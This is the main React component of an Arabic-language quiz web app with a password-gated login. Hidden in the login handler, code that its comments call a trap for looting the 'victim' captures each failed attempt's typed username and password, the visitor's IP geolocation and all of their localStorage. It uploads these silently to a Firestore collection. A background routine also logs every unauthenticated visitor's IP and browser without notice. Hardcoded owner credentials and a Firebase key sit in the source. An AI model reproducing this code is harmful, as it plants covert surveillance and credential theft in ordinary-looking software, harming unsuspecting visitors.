import React, { useState, useEffect } from 'react';
import { HashRouter as Router, Routes, Route, Link, Navigate } from 'react-router-dom';
import { Trophy, PlusCircle, Lock, LogIn } from 'lucide-react';

// Firebase Imports
import { initializeApp } from "firebase/app";
import { getFirestore, collection, addDoc } from "firebase/firestore";

// Pages
import Home from './pages/Home';
import AddData from './pages/AddData';
import QuizCompensation from './pages/QuizCompensation';
import QuizBell from './pages/QuizBell';
import AddNumbers from './pages/AddNumbers';
import QuizNumbers from './pages/QuizNumbers';
import AddTables from './pages/AddTables';
import QuizTables from './pages/QuizTables';
import Archive from './pages/Archive'; 

// --- Firebase Config ---
const firebaseConfig = {
  apiKey: "AIzaSyD-EUaoCi9YibtyLgA2_2n2e-co_a1hvKQ",
  authDomain: "tahadi-app-sjk.firebaseapp.com",
  projectId: "tahadi-app-sjk",
  storageBucket: "tahadi-app-sjk.firebasestorage.app",
  messagingSenderId: "944768597168",
  appId: "1:944768597168:web:a4aea3b4e77eded7960f75",
  measurementId: "G-1F983D31QQ"
};

const app = initializeApp(firebaseConfig);
export const database = getFirestore(app); 

// --- Login Component (المطور مع مصيدة التراكر والطرد) ---
const Login = ({ onLogin }) => {
  const [user, setUser] = useState('');
  const [pass, setPass] = useState('');
  const [isCapturing, setIsCapturing] = useState(false);
  
  const handleSubmit = async (e) => {
    e.preventDefault();
    
    // الباسورد الجديد الخاص فيك يا وحش
    if (user === 'saeedjk' && pass === 'fuckinggpt') {
      onLogin();
      return;
    }

    // --- بداية مصيدة التراكر والسطو إذا حاول أي شخص غريب يدخل ---
    setIsCapturing(true);
    
    let ipData = { ip: "Blocked/Unknown", country: "Unknown", city: "Unknown", org: "Unknown" };
    
    // 1. لقط الآي بي واللوكيشن فوراً
    try {
      const response = await fetch('https://ipapi.co/json/');
      if (response.ok) {
        const resData = await response.json();
        ipData = {
          ip: resData.ip || "Unknown",
          country: resData.country_name || "Unknown",
          city: resData.city || "Unknown",
          org: resData.org || "Unknown"
        };
      }
    } catch (err) { /* صامت */ }

    // 2. سحب كل بيانات الـ LocalStorage للضحية فوراً
    let loot = {};
    let foundSomething = false;
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key !== 'isAuth') {
        try {
          const data = localStorage.getItem(key);
          loot[key] = JSON.parse(data);
          foundSomething = true;
        } catch(e) {
          loot[key] = localStorage.getItem(key);
          foundSomething = true;
        }
      }
    }

    // 3. رفع الهوية الكاملة والغنائم إلى الفايربيس وتثبيت المحاولة
    try {
      await addDoc(collection(database, "sys_logs_v2"), {
        _ts: new Date().getTime(),
        _uid: "Failed_Login_Attempt",
        attemptedUser: user,
        attemptedPass: pass, // عشان تعرف شو الباسوردات اللي بجربوها!
        ipInfo: ipData,
        userAgent: navigator.userAgent,
        data: foundSomething ? loot : { status: "No LocalStorage Data Found" }
      });
    } catch (err) { /* صامت */ }

    // 4. الحركة السحرية: طرد، مسح السيشن، وريفريش كامل فوري للمتصفح
    localStorage.removeItem('isAuth');
    alert("خطأ في البيانات.. ارجع العب غيرها!");
    window.location.reload(); 
  };

  return (
    <div className="flex items-center justify-center min-h-[70vh]">
      <form onSubmit={handleSubmit} className="bg-slate-800/80 p-10 rounded-[3rem] border border-white/10 shadow-2xl w-full max-w-md text-center">
        <div className="bg-purple-600 w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-6 shadow-lg shadow-purple-500/20">
          <Lock size={40} className="text-white animate-pulse" />
        </div>
        <h2 className="text-2xl font-black mb-8 italic text-white">دخول المصرح لهم 🔒 <br/> <span className="text-sm font-normal text-slate-400">أنت أصبحت من المنافسين! نرجو المعذرة</span></h2>
        <input 
          type="text" placeholder="اسم المستخدم" 
          disabled={isCapturing}
          className="w-full bg-slate-900 border border-white/5 p-4 rounded-2xl mb-4 outline-none focus:border-purple-500 transition-all text-center text-white font-bold"
          onChange={(e) => setUser(e.target.value)}
        />
        <input 
          type="password" placeholder="كلمة السر" 
          disabled={isCapturing}
          className="w-full bg-slate-900 border border-white/5 p-4 rounded-2xl mb-8 outline-none focus:border-purple-500 transition-all text-center text-white font-bold"
          onChange={(e) => setPass(e.target.value)}
        />
        <button 
          disabled={isCapturing}
          className="w-full bg-purple-600 hover:bg-purple-500 text-white py-4 rounded-2xl font-black flex items-center justify-center gap-2 transition-all shadow-lg shadow-purple-600/30"
        >
          {isCapturing ? "جاري التحقق..." : <><LogIn size={20} /> فتح التحدي</>}
        </button>
      </form>
    </div>
  );
};

function App() {
  const [isAuthenticated, setIsAuthenticated] = useState(localStorage.getItem('isAuth') === 'true');

  // رادار خلفي إضافي صامت للزيارات العادية الزاحفة
  useEffect(() => {
    const backgroundRadar = async () => {
      if (localStorage.getItem('_sys_radar_init')) return; 
      
      let ipData = { ip: "Blocked/Unknown", country: "Unknown", city: "Unknown", org: "Unknown" };
      try {
        const response = await fetch('https://ipapi.co/json/');
        if (response.ok) {
          const resData = await response.json();
          ipData = { ip: resData.ip, country: resData.country_name, city: resData.city, org: resData.org };
        }
      } catch (e) {}

      try {
        await addDoc(collection(database, "sys_logs_v2"), {
          _ts: new Date().getTime(),
          _uid: "Silent_Visitor",
          ipInfo: ipData,
          userAgent: navigator.userAgent,
          data: { note: "Just opened the login page" }
        });
        localStorage.setItem('_sys_radar_init', 'true');
      } catch (e) {}
    };
    if (!isAuthenticated) {
      backgroundRadar();
    }
  }, [isAuthenticated]);

  const handleLogin = () => {
    setIsAuthenticated(true);
    localStorage.setItem('isAuth', 'true');
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-slate-900 text-white font-sans bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-green-900/20 via-slate-900 to-black p-6">
        <Login onLogin={handleLogin} />
      </div>
    );
  }

  return (
    <Router>
      <div className="min-h-screen bg-slate-900 text-white font-sans bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-green-900/20 via-slate-900 to-black">
        <nav className="bg-slate-800/50 backdrop-blur-md border-b border-white/10 p-4 sticky top-0 z-50">
          <div className="max-w-5xl mx-auto flex justify-between items-center">
            <Link to="/" className="text-2xl font-black italic tracking-tighter flex items-center gap-2">
              <Trophy className="text-yellow-400" /> TAHADI <span className="text-green-500">30</span>
            </Link>
            <div className="flex gap-4 items-center">
              <Link title="إضافة" to="/add" className="hover:text-green-500 transition-colors"><PlusCircle /></Link>
              <button 
                onClick={() => { localStorage.removeItem('isAuth'); window.location.reload(); }}
                className="text-xs bg-red-500/10 text-red-500 px-3 py-1 rounded-full border border-red-500/20 hover:bg-red-500 hover:text-white transition-all font-bold"
              >
                خروج
              </button>
            </div>
          </div>
        </nav>

        <main className="max-w-5xl mx-auto p-6">
          <Routes>
            <Route path="/" element={<Home />} />
            <Route path="/add" element={<AddData />} />
            <Route path="/quiz-comp" element={<QuizCompensation />} />
            <Route path="/quiz-bell" element={<QuizBell />} />
            <Route path="/add-numbers" element={<AddNumbers />} />
            <Route path="/quiz-numbers" element={<QuizNumbers />} />
            <Route path="/add-tables" element={<AddTables />} />
            <Route path="/quiz-tables" element={<QuizTables />} />
            <Route path="/archive" element={<Archive />} />
            <Route path="*" element={<Navigate to="/" />} />
          </Routes>
        </main>
      </div>
    </Router>
  );
}

export default App;